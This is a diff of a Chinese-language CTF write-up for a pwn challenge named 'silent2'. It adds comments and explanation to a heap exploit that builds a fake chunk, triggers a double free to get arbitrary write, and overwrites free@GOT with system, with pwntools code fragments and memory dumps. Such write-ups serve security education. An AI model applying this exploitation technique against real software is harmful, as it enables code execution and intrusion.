@@ -5,12 +5,11 @@
 checksec
 
 ```
-    Arch:     amd64-64-little
+	Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-
 ```
 
 可以对got表进行写
@@ -66,31 +65,49 @@ free依然没有把指针清空。
 double free达到地址任意写，修改free_got为system地址
 
 ```
-add(0x90,'a'*0x80)
-add(0x90,'b'*0x80)
-add(0x90,'/bin/sh')
-add(0x90,'c'*0x80)
-add(0x90,'d'*0x80)
+add(0x90,'a'*0x80)		#0
+add(0x90,'b'*0x80)		#1
+add(0x90,'/bin/sh')		#2
+add(0x90,'c'*0x80)		#3
+add(0x90,'d'*0x80)		#4
 free(4)
 free(3)
 paylaod = p64(0)+p64(0x90)+p64(p_addr-0x18)+p64(p_addr-0x10)+'x'*0x70
 payload += p64(0x90)+p64(0xa0)
 add(0x130,payload)
 free(4)
+
 ```
+
+把3 4 free掉，构造fake chunk
+
+```
+0000  0xa1   #3
+0000  0x90
+addr  addr
+xxxx  xxxx
+......
+0x90  0xa0   #4
+.........
+```
+
+double free后，3的指针指向p_addr-0x18 即chunk0的指针
+
 ```
 0x602080 <stdout>:	0x00007fc0d53d0620	0x0000000000000000
 0x602090 <stdin>:	0x00007fc0d53cf8e0	0x0000000000000000
 0x6020a0 <stderr>:	0x00007fc0d53d0540	0x0000000000000000
 0x6020b0:	0x0000000000000000	0x0000000000000000
-0x6020c0:	0x0000000000dca010	0x0000000000dca0b0
-0x6020d0:	0x0000000000dca150	0x0000000000dca1f0
-0x6020e0:	0x0000000000dca290	0x0000000000000000
+0x6020c0:	0x0000000000dca010	#0  0x0000000000dca0b0  #1
+0x6020d0:	0x0000000000dca150	 #2 0x0000000000dca1f0     #3
+0x6020e0:	0x0000000000dca290	#5 0x0000000000000000
+
 
 ```
 
 exp
-```
+
+```python
 from pwn import *
 
 r = process("./silent2")
@@ -131,3 +148,4 @@ free(2)
 r.interactive()
 
 ```
+
